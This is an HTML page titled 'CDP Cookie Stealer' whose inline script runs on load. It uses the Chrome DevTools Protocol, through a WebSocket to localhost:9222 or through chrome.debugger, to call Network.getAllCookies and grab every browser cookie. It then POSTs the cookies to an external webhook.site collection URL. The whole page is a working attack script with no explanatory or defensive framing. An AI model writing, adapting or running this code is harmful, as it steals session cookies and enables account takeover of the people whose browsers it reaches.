<!DOCTYPE html>
<html>
  <head>
    <title>CDP Cookie Stealer</title>
  </head>
  <body>
    <script>
      async function stealCookies() {
        try {
          const ws = new WebSocket("ws://localhost:9222/devtools/browser");
          ws.onopen = () => {
            console.log("CDP connected!");
            ws.send(
              JSON.stringify({
                id: 1,
                method: "Network.getAllCookies",
                params: {},
              })
            );
          };
          ws.onmessage = (event) => {
            console.log("Cookies:", event.data);
            fetch("https://webhook.site/6b257d25-224c-4457-9644-3adef4e63478", {
              method: "POST",
              body: event.data,
            });
          };
        } catch (e) {
          console.error("CDP access failed:", e);
        }

        if (typeof chrome !== "undefined" && chrome.debugger) {
          chrome.debugger.attach(
            { tabId: chrome.devtools.inspectedWindow.tabId },
            "1.3",
            () => {
              chrome.debugger.sendCommand(
                { tabId: chrome.devtools.inspectedWindow.tabId },
                "Network.getAllCookies",
                {},
                (result) => {
                  console.log("Cookies via debugger:", result);
                  fetch(
                    "https://webhook.site/6b257d25-224c-4457-9644-3adef4e63478",
                    {
                      method: "POST",
                      body: JSON.stringify(result),
                    }
                  );
                }
              );
            }
          );
        }
      }

      stealCookies();
    </script>
  </body>
</html>
